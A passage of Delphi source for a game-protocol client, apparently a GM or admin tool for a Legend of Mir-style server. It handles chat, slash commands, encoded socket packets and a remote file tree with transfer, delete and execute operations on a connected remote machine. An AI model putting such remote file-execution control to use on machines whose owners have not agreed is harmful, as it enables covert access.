            ClientGetPList(body);
          end;
        SM_APPENDMLIST: begin
            ClientGetMList(body);
          end;
        SM_APPENDDATA: begin
            ClientGetData(@Msg, body);
          end;
        SM_APPENDUPDATA: begin
            ClientSetData(@Msg, body);
          end;
        SM_APPENDDEL: begin
            UnLockButton;
            if Msg.Recog = 1 then begin
              DelTree(SelectNode);
            end;
          end;
        SM_APPENDEX: begin
            if Msg.Recog > 32 then begin
              ShowMessage('执行成功...');
            end else begin
              ShowMessage('执行失败...');
            end;
            UnLockButton;
          end;
        SM_APPENDCLOSE: CLientClose(@Msg);
        SM_APPENDOBJECTCLOSE: begin
          ChangeShowDlg(True, '已断开');
          ShowMessage('远程用户已经断开...');
        end;
        SM_APPENDGLIST: ClientGetUserList(@Msg, body);

        SM_SENDNOTICE: SendClientMessage(CM_LOGINNOTICEOK, 0, 0, 0, 0);
        SM_HEAR,
          SM_CRY, //喊话
        SM_GROUPMESSAGE, //   组队
        SM_GUILDMESSAGE, //行会
        SM_WHISPER, //私聊
        SM_SYSMESSAGE, {//系统消息}
        SM_BUGLE: begin
            mmoGameLog.Lines.Add(DecodeString(body));
          end;
      end;
    end;
  end;
end;

procedure TFormMain.DelTree(TreeView: TTreeNode);
begin
  tv1.Items.Delete(TreeView);
end;

procedure TFormMain.DelTreeBy(TreeView: TTreeNode);
var
  TempTreeView, TempTreeView2: TTreeNode;
  I: Integer;
begin
  for I := tv1.Items.Count - 1 downto 0 do begin
    TempTreeView2 := tv1.Items[I];
    TempTreeView := TempTreeView2;
    while (TempTreeView.Parent <> nil) do begin
      if TempTreeView.Parent = TreeView then begin
        tv1.Items.Delete(TempTreeView2);
        Break;
      end;
      TempTreeView := TempTreeView.Parent;
    end;
  end;
end;

procedure TFormMain.edtcmdKeyPress(Sender: TObject; var Key: Char);
var
  sStr, sCmd, sParam1, sParam2, sParam3, sParam4: string;
begin
  if Key = #13 then begin
    sStr := Trim(edtcmd.Text);
    sStr := GetValidStr3(sStr, sCmd, [' ']);
    sStr := GetValidStr3(sStr, sParam1, [' ']);
    sStr := GetValidStr3(sStr, sParam2, [' ']);
    sStr := GetValidStr3(sStr, sParam3, [' ']);
    sStr := GetValidStr3(sStr, sParam4, [' ']);
    m_CmdInfo.sCmd := sCmd;
    m_CmdInfo.sParam1 := sParam1;
    m_CmdInfo.sParam2 := sParam2;
    m_CmdInfo.sParam3 := sParam3;
    m_CmdInfo.sParam4 := sParam4;
    m_CmdInfo.nParam1 := StrToIntDef(sParam1, 0);
    m_CmdInfo.nParam2 := StrToIntDef(sParam2, 0);
    m_CmdInfo.nParam3 := StrToIntDef(sParam3, 0);
    m_CmdInfo.nParam4 := StrToIntDef(sParam4, 0);

    if CompareText(sCmd, CMD_LOGIN) = 0 then begin
      CmdLogin(@m_CmdInfo);
    end else
    if CompareText(sCmd, CMD_NLOGIN) = 0 then begin
      CmdNLogin(@m_CmdInfo);
    end else
    if CompareText(sCmd, CM_CHECKPASS) = 0 then begin
      CmdCheck(@m_CmdInfo);
    end else
    if CompareText(sCmd, CM_GM) = 0 then begin
      CmdGM(@m_CmdInfo);
    end;

    FormActivate(Self);
  end;
end;

procedure TFormMain.FormActivate(Sender: TObject);
begin
  edtcmd.Text := '/';
  edtcmd.SetFocus;
  edtcmd.SelStart := Length(edtcmd.Text);
end;

procedure TFormMain.FormCreate(Sender: TObject);
//var
  //temp: string;
begin
  mmoGameLog.Lines.Clear;
  mmoLog.Lines.Clear;
  InitializeCriticalSection(FCriticalSection);
  FSendSocketStr := '';
  boLogin := False;
  CheckSpeedTick := 0;
  boCheckSpeed := False;
  boPlay := False;
  boSelChr := False;
  BufferStr := '';
  SelectNode := nil;
  ChangeShowDlg(False, '');
  DownStream := nil;
  UserList := TStringList.Create;
  ImageNameList := TStringList.Create;
  ImageNameList.AddObject('.EXE', TObject(3));
  //ArrestStringEx('>dsfas<dfasdfa>sdfa<', '<', '>', temp);
 //showmessage(temp);
  //ExtractFileExt(fname); 取文件尾名  .exe
  //ExtractFileName(fname);  取文件名 XXX.exe
  {tv1.Items.Add(nil, '3333');
  tv1.Items.AddChild(tv1.Items.Add(nil, '1233'), 'bbbb');
  tv1.Items.Add(nil, '123456');
  tv1.Items.Add(nil, '123456');
  tv1.Items.Add(nil, '123456');
  tv1.Items.Add(nil, '123456');   }
end;

procedure TFormMain.FormDestroy(Sender: TObject);
begin
  DeleteCriticalSection(FCriticalSection);
  if DownStream <> nil then
    DownStream.Free;
  ImageNameList.Free;
  UserList.Free;
end;

function TFormMain.ExtractIconFileName(const FileName: string): string;
var
  I: Integer;
begin
  I := LastDelimiter(',' + PathDelim + DriveDelim, FileName);
  if (I > 0) and (FileName[I] = ',') then
    Result := Copy(FileName, 0, I - 1) else
    Result := '';
end;

function TFormMain.ExtractIconIndex(const FileName: string): Integer;
var
  I: Integer;
begin
  I := LastDelimiter(',' + PathDelim + DriveDelim, FileName);
  if (I > 0) and (FileName[I] = ',') then
    Result := StrToIntDef(Copy(FileName, I + 1, MaxInt), -1) else
    Result := -1;
end;

function TFormMain.GetFileIconIndex(sName: string): Integer;
  function FormatFileName(sFileName: string): string;
  var
    TempStr, s10, s18: string;
  begin
    Result := sFileName;
    if (sFileName <> '') and (sFileName[1] = '"') then
      ArrestStringEx(sFileName, '"', '"', sFileName);
    TempStr := sFileName;
    while (True) do begin
      if pos('%', TempStr) <= 0 then break;
      TempStr := ArrestStringEx(TempStr, '%', '%', s10);
      if s10 <> '' then begin
        s18 := GetEnvironmentVariable(s10);
        if s18 <> '' then begin
          sFileName := AnsiReplaceText(sFileName, '%' + s10 + '%', s18);
        end;
      end;
    end;
    Result := sFileName;
  end;
var
  sExt, sExtName, sIconFile, sFileName: string;
  nIndex: Integer;
  Reg: TRegistry;
  Large, Small: HICON;
  Icon: TIcon;
begin
  Result := 2;
  sExt := ExtractFileExt(sName);
  nIndex := ImageNameList.IndexOf(sExt);
  if nIndex = -1 then begin
    Reg := TRegistry.Create;
    Try
      sExtName := '';
      Reg.RootKey := HKEY_CLASSES_ROOT;
      if Reg.OpenKey(sExt, False) then begin
        sExtName := Reg.ReadString('');
      end;
      Reg.CloseKey;
      sIconFile := '';
      if (sExtName <> '') and Reg.OpenKey(sExtName + '\DefaultIcon', False) then begin
        sIconFile := Reg.ReadString('');
      end;
      Reg.CloseKey;
      if sIconFile <> '' then begin
        sFileName := FormatFileName(ExtractIconFileName(sIconFile));
        nIndex := ExtractIconIndex(sIconFile);
        if (nIndex <> -1) {and FileExists(sFileName)} then begin
          Small := 0;
          ExtractIconEx(PChar(sFileName), nIndex, Large, Small, 1);
          if Small <> 0 then begin
            Icon := TIcon.Create;
            Icon.Handle := Small;
            Result := il1.AddIcon(Icon);
            Icon.Free;
          end;
        end;
      end;
    Finally
      Reg.Free;
    End;
    ImageNameList.AddObject(sExt, TObject(Result));
  end else begin
    Result := Integer(ImageNameList.Objects[nIndex]);
  end;
end;

procedure TFormMain.MainOutMessage(sMsg: string; MsgType: TMsgType);
begin
  if mmoLog.Lines.Count > 200 then
    mmoLog.Lines.Delete(0);
  case MsgType of
    t_exe: mmoLog.Lines.Add('[执行]：' + sMsg);
    t_hint: mmoLog.Lines.Add('[提示]：' + sMsg);
  end;

end;

function TFormMain.RSADecodeString(sMsg: string): string;
begin
  Result := rs1.DecryptStr(sMsg);
end;

function TFormMain.RSAEncryptString(sMsg: string): string;
begin
  Result := rs1.EncryptStr(sMsg);
end;

procedure TFormMain.SendClientMessage(Msg, Recog, param, tag, series: Integer; pszMsg: string);
begin
  m_DefMsg := MakeDefaultMsg(Msg, Recog, param, tag, series);
  if pszMsg <> '' then
    SendSocket(EncodeMessage(m_DefMsg) + EncodeString(pszMsg))
  else
    SendSocket(EncodeMessage(m_DefMsg));
end;

procedure TFormMain.SendClientSocket(Msg, Recog, param, tag, series: Integer; pszMsg: string);
begin
  m_DefMsg := MakeDefaultMsg(Msg, Recog, param, tag, series);
  if pszMsg <> '' then
    SendSocket(EncodeMessage(m_DefMsg) + pszMsg)
  else
    SendSocket(EncodeMessage(m_DefMsg));
end;

procedure TFormMain.SendSocket(sendstr: string);
const
  Code: byte = 1;
begin
  if CSocket.Socket.Connected then begin
    SendSocketEx(g_CodeHead + IntToStr(Code) + sendstr + g_CodeEnd);
    Inc(Code);
    if Code >= 10 then
      Code := 1;
  end;
end;

procedure TFormMain.SendSocketEx(sendstr: string);
begin
  SocketLock;
  try
    if CSocket.Socket.Connected then begin
      if CSocket.Socket.SendText(FSendSocketStr + sendstr) = -1 then begin
        FSendSocketStr := FSendSocketStr + sendstr;
        if length(FSendSocketStr) > 1024 * 1024 then
          FSendSocketStr := '';
      end
      else
        FSendSocketStr := '';
    end
    else
      FSendSocketStr := '';
  finally
    SocketUnLock;
  end;
end;

procedure TFormMain.SocketLock;
begin
  EnterCriticalSection(FCriticalSection);
end;

procedure TFormMain.SocketUnLock;
begin
  LeaveCriticalSection(FCriticalSection);
end;

procedure TFormMain.tmr1Timer(Sender: TObject);
var
  nSize: Integer;
  dwTime, dwHour, dwMin, dwSec: LongWord;
begin
  if nNowSize <= 0 then exit;
  nSize := nMaxSize - nSendSize;
  if nSize > 0 then begin
    dwTime := Round(nSize / nNowSize);
    dwHour := dwTime div (60 * 60);
    dwMin := (dwTime mod (60 * 60)) div 60;
    dwSec := (dwTime mod (60 * 60)) mod 60;
    lbl8.Caption := Format('%.2d:%.2d:%.2d', [dwHour, dwMin, dwSec]);
  end else begin
    lbl8.Caption := '00:00:00';
  end;
  nNowSize := 0;
end;

procedure TFormMain.tmrSocketTimer(Sender: TObject);
var
  data: string;
  //  mcnt: Integer;
const
  busy: Boolean = FALSE;
begin
  if busy then
    Exit;
  busy := True;
  try
    BufferStr := BufferStr + SocStr;
    SocStr := '';
    if BufferStr <> '' then begin
      while Length(BufferStr) >= 2 do begin
        if pos(g_CodeEnd, BufferStr) <= 0 then
          break;
        BufferStr := ArrestStringEx(BufferStr, g_CodeHead, g_CodeEnd, data);
        if data = '' then
          break;
        DecodeMessagePacket(data);
        if pos(g_CodeEnd, BufferStr) <= 0 then
          break;
      end;
    end;
    
    if boPlay then begin
      if boCheckSpeed and (GetTickCount > CheckSpeedTick) then begin
        boCheckSpeed := False;
        SendSocketEx(g_ClientCheck);
      end;
    end;

    SocketLock;
    try
      if FSendSocketStr <> '' then
        SendSocketEx('');
    finally
      SocketUnLock;
    end;
  finally
    busy := FALSE;
  end;

end;

procedure TFormMain.tv1Change(Sender: TObject; Node: TTreeNode);
var
  TempNode: TTreeNode;
  sStr: string;
  nSize: Integer;
  sSize: string;
begin
  if Node = nil then exit;
  SelectNode := Node;
  nSize := Integer(SelectNode.Data);
  boDir := nSize = -1;
  sStr := SelectNode.Text;
  TempNode := SelectNode.Parent;
  while (TempNode <> nil) do begin
    if RightStr(TempNode.Text, 1) = '\' then sStr := TempNode.Text + sStr
    else  sStr := TempNode.Text + '\' + sStr;
    TempNode := TempNode.Parent;
  end;
  if nSize = -1 then begin
    sSize := '目录';
  end else
  if nSize > (1024 * 900) then begin
    sSize := Format('%.2fM', [nSize / 1024 / 1024]);
  end else begin
    sSize := Format('%.2fK', [nSize / 1024]);
  end;
  grp6.Caption := '目录列表(' + sSize + ')(' + sStr + ')' ;
  btn4.Enabled := not boDir;
  btn3.Enabled := boDir;
  btn10.Enabled := boDir;
  btn11.Enabled := not boDir;
  btn12.Enabled := not boDir;
end;

procedure TFormMain.WaitAndPass(msec: LongWord);
var
  start: LongWord;
begin
  start := GetTickCount;
  while GetTickCount - start < msec do begin
    Application.ProcessMessages;
  end;
end;

end.

